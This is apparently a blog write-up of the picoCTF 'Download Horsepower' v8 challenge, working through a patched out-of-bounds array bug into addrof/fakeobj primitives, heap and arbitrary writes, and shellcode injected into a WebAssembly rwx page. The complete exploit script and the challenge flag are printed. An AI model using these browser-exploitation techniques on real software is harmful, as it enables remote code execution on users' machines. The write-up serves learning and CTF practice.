---
layout: post
title: picoCTF v8 exploitation, part 1
---
Even though I didn't do the v8 pwns during the timeframe of the competition, I was interested in learning v8 exploitation and so I upsolved them.

This is the first time I've ever done any browser exploitation, and I hope that documenting my thought process will be a reference for future me. Perhaps one day I will look back at this writeup like I look at [my writeup of my first heap challenge](https://blog.joshwang.me/2020/06/28/rpctf/).

## Download Horsepower

This was essentially the `Four Function Heap` version of v8 exploitation to me. I learned so much about how v8 objects are represented in memory (and how to corrupt them, of course).

Reading the patch, it is clear that they give us essentially an unlimited Out-Of-Bounds read/write in an array:
```
...
+namespace array {
+
+transitioning javascript builtin
+ArraySetHorsepower(
+  js-implicit context: NativeContext, receiver: JSAny)(horsepower: JSAny): JSAny {
+    try {
+      const h: Smi = Cast<Smi>(horsepower) otherwise End;
+      const a: JSArray = Cast<JSArray>(receiver) otherwise End;
+      a.SetLength(h);
+    } label End {
+        Print("Improper attempt to set horsepower");
+    }
+    return receiver;
+}
+}
...
```
<!-- more -->

Thus, if we set `a = [1,2]`, and then call `.setHorsepower(n)` where n > 2, we can actually read past the end of the array!

So what exists past the end of the array?

The diagram in [this Medium article](https://medium.com/@bpmxmqd/v8-engine-jsobject-structure-analysis-and-memory-optimization-ideas-be30cfcdcd16) worked wonders for my mental visualization. `a` is a `JSArray`, which inherits from `JSObject`.


### small bit on object representation in memory
`a` has a pointer to its map, its properties, and its elements. The `map` of a `JSObject` basically contains information about the object, including the **types** it has. It's sort of like a blueprint for the object.

Currently, the `a` object has a map which says that it currently holds `PACKED_SMI_ELEMENTS` typed elements. The values in the array will be 2 times the actual value, due to a mechanic called [pointer compression and tagging](https://v8.dev/blog/pointer-compression).

The same pointer tagging also means that doubles and pointers do not mix well. If we were somehow able to confuse v8 and write a double to what we want to be a pointer value, we would never be able to set the LSB, and it would never be recognized as a pointer.

However, v8 also lets you store IEEE754 floats, and those could also have their LSBs set. How does v8 tell the difference between a float and an object pointer?

A: It doesn't

The typing system goes `SMI -> IEEE754 float -> HeapObject`.

- When an array only has integers, everything is an SMI.
- When an array has at least one IEEE754 float, everything becomes an IEEE754 float.
- When an array has at least one object, everything becomes a pointer to an object. Values are thus stored in a separate, `HeapObject`. So, pointers and floats are never mixed.

To make it easier to convert between IEEE754 floats and actual integers, the following helper functions are used:

```javascript
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8) // 8 byte array buffer
var f64_buf = new Float64Array(buf)
var u64_buf = new Uint32Array(buf)

function hex(val){
    return "0x"+val.toString(16)
}

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n) // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n)
    return f64_buf[0]
}
```

`ftoi` converts a IEEE754 float to a BigInt, and `itof` converts a BigInt into an IEEE754 float.


### addrof and fakeobj primitives
After some investigation, it turns out that the elements pointer of small arrays such as `[1.1, 2.2]` actually reside right before their `JSArray` parents in memory. Using our OOB read/write, we can actually control the pointers in `JSArray`, as well as data past that.

Consider the following setup:
```javascript
a = [{}, 2.2]
b = [3.3, 4.4]
```

`a`'s map says that everything is stored in pointers to Objects. Further additions will also add a pointer to an object.

On the contrary, `b`'s map says that everything is stored in an IEEE754 float representation.

In it's current state, this is useless. However, once we use our OOB, this is actually how we can solve the challenge.

Because `b` comes after `a` in memory, at some point we should be able to access `b`'s elements from `a` using our basically unlimited OOB. It turns out that the offset is at index ~15. I say ~15 because the heap layout is pretty sensitive, so any small changes might affect the offset slightly.

While exploiting, I was stuck for a while here. I drew up a diagram similar to the one below and realized how to solve it:

![](https://i.imgur.com/slG3q3z.png)


Recall how `a` stores its elements - they are all pointers. So, if we set `a[15]` to `{}`, it would also affect `b[0]` since they are overlapping. But, `b` thinks everything is in IEEE754 float representation, and just returns that pointer (as a float)!

And so, we now can find the address of any object that we want. This is called the `addrof` primitive.

Now, imagine the opposite: modifying `b[0]` to have the IEEE754 float representation of a pointer that we want, and then getting it by using `a[15]`. This is the `fakeobj` primitive.

```javascript
a = [{}, 2.2]
b = [3.3, 4.4]

off = 15

a.setHorsepower(20)
b.setHorsepower(50)



function addrof(obj){
    a[off] = obj
    return ftoi(b[0]) & 0xffffffffn
}


function fakeobj(addr){
    b[0] = itof(addr)
    return a[off]
}

d = {}
print("d test @", hex(addrof(d)))

while(addrof(d) == 0x66666666){
    off++
    print("d test @", hex(addrof(d)))
}

```

Note that the offset is incremented until addrof works because the offset can change a bit depending on the heap layout.

### restricted read and write
Consider the following array setup:
```
[metadata] +0x0: <pointer to float map>
[metadata] +0x4: <length of elements>
[0]        +0x8: <pointer to float map>
           +0xc: <whatever we want 1>
[1]       +0x10: <pointer to where we want to write>
          +0x14: <whatever we want 2>
```

We can make a dummy array and set up `[0]` and `[1]`.

What if we got a fake object at `+0x8`?
- map pointer would be that of a float map
- properties pointer would point to `<whatever we want 1>`
- elements pointer would point to `<pointer to where we want to write>`
- length would be `<whatever we want 2>`


We can leak a float map by reading (out of bounds) `b[2]`.

Now if we modify the dummy array's index 1, we can control where `elements` points! This lets us read and write within the heap using our fake object by reading and writing to its elements with `[]`.

```javascript
float_map = ftoi(b[2]) & 0xffffffffn

print("float map", hex(float_map))


c = [itof(float_map), itof((4n << 32n) + 0x69696969n)]

print("c @", hex(addrof(c)))



function read(addr){
    if (addr % 2n == 0){
        addr += 1n
    }

    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 60n + 8n)

    return ftoi(fake[0])
}



function heap_write(addr, data){
    if (addr % 2n == 0){
        addr += 1n
    }
    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 60n + 8n)


    fake[0] = itof(data)
}
```



### arbitrary read and write
We can now find the address of an object, and read and write to a location on the heap.

However, we can't read and write to *any* address, because of pointer compression. Recall that compressed pointers are added to the base of the heap address to get the actual pointer. This means we cannot read and write outside of our heap.


To get a truly arbitrary read and write, we can use an `ArrayBuffer` and `DataView`. An `ArrayBuffer` is similar to an Array object - it also has a pointer to where its elements are, which is now called the `backing_store`. However, the `backing_store` pointer is uncompressed.

Getting control of it would mean we can read and write to any address without getting the heap base added to it.

Fortunately, when we create an `ArrayBuffer`, it's on the heap. We can use our read and writes from the previous section to modify the `backing_store` of an evil `ArrayBuffer`, and thus get a truly arbitrary read and write.

We don't really need the arbitrary read for RCE, so it is left as an exercise to the reader.

```javascript
function arb_write32(addr, data){
    if (addr % 2n == 1){
        addr -= 1n
    }

    let dataview = new DataView(buf)


    heap_write(addrof(buf) + 0x14n, addr)


    dataview.setBigUint64(0, data, true)
}


buf = new ArrayBuffer(0x100)

print("evil buf @", hex(addrof(buf)))
```


### remote (shell)code execution
What are we going to do with our reads and writes to get a shell?

Fortunately, WebAssembly objects comes the rescue. JavaScript lets us compile WebAssembly to machine code, and then execute it. In doing so, it creates an `rwx` page. Big :eyes:.

WebAssembly normally doesn't directly let you read files using WebAssembly code - that would be awful for security. Instead, everything is sandboxed. However, we can ignore that sandbox by directly writing to the `rwx` page for a function.

The pointer to the `rwx` page is saved at an offset from the address of the wasm instance. I used GDB to search in memory for the address containing the pointer, then subtracted it from the address of the wasm instance that I found using the `addrof` primitive.

In this example, it turns out that the pointer to the `rwx` page is `+104` from the address of the wasm instance, or `+103` from the tagged address, though offsets might vary across different builds.



We can copy our shellcode, which runs `cat flag.txt`, to the rwx page. This overwrites the instructions there with our shellcode, which gets run when we call the wasm function.

```javascript
// create wasm instance and rwx page
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main

buf = new ArrayBuffer(0x100)

print("evil buf @", hex(addrof(buf)))


rwx_page = read(addrof(wasm_instance) + 103n)

print("rwx @", hex(rwx_page))


shellcode = [0xcfe016a, 0x66b84824, 0x2e67616c, 0x50747874, 0x4858026a, 0xf631e789, 0x90050f99, 0x41909090, 0xffffffba, 0xc689487f, 0x6a58286a, 0xf995f01, 0x5]

dataview = new DataView(buf)
heap_write(addrof(buf) + 0x14n, rwx_page)

for(i = 0; i < shellcode.length; ++i){
    dataview.setBigUint64(i*4, BigInt(shellcode[i]), true)
}

f()
```

### Script
All together, this was my solution script. I put the wasm instance creation at the top of the script, because I was encountering a weird race condition where my shellcode would get overwritten with the compiled wasm if I wrote too quickly.

```javascript
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8) // 8 byte array buffer
var f64_buf = new Float64Array(buf)
var u64_buf = new Uint32Array(buf)

function hex(val){
    return "0x"+val.toString(16)
}

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n) // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n)
    return f64_buf[0]
}


a = [{}, 2.2]
b = [3.3, 4.4]

off = 15

a.setHorsepower(20)
b.setHorsepower(50)



function addrof(obj){
    a[off] = obj
    return ftoi(b[0]) & 0xffffffffn
}


function fakeobj(addr){
    b[0] = itof(addr)
    return a[off]
}


d = {}
print("d test @", hex(addrof(d)))

while(addrof(d) == 0x66666666){
    off++
    print("d test @", hex(addrof(d)))
}


float_map = ftoi(b[2]) & 0xffffffffn

print("float map", hex(float_map))


c = [itof(float_map), itof((4n << 32n) + 0x69696969n)]

print("c @", hex(addrof(c)))



function read(addr){
    if (addr % 2n == 0){
        addr += 1n
    }

    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 60n + 8n)

    return ftoi(fake[0])
}



function heap_write(addr, data){
    if (addr % 2n == 0){
        addr += 1n
    }
    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 60n + 8n)


    fake[0] = itof(data)
}





function arb_write32(addr, data){
    if (addr % 2n == 1){
        addr -= 1n
    }

    let dataview = new DataView(buf)


    heap_write(addrof(buf) + 0x14n, addr)


    dataview.setBigUint64(0, data, true)
}


buf = new ArrayBuffer(0x100)

print("evil buf @", hex(addrof(buf)))


rwx_page = read(addrof(wasm_instance) + 103n)

print("rwx @", hex(rwx_page))


shellcode = [0xcfe016a, 0x66b84824, 0x2e67616c, 0x50747874, 0x4858026a, 0xf631e789, 0x90050f99, 0x41909090, 0xffffffba, 0xc689487f, 0x6a58286a, 0xf995f01, 0x5]

dataview = new DataView(buf)
heap_write(addrof(buf) + 0x14n, rwx_page)

for(i = 0; i < shellcode.length; ++i){
    dataview.setBigUint64(i*4, BigInt(shellcode[i]), true)
}

f()
```


Flag: `picoCTF{sh0u1d_hAv3_d0wnl0ad3d_m0r3_rAm_ 7d527e4f03815bf}`

In my next post, I will write up Turboflan, which deals with exploiting type confusion in TurboFan compiled functions.
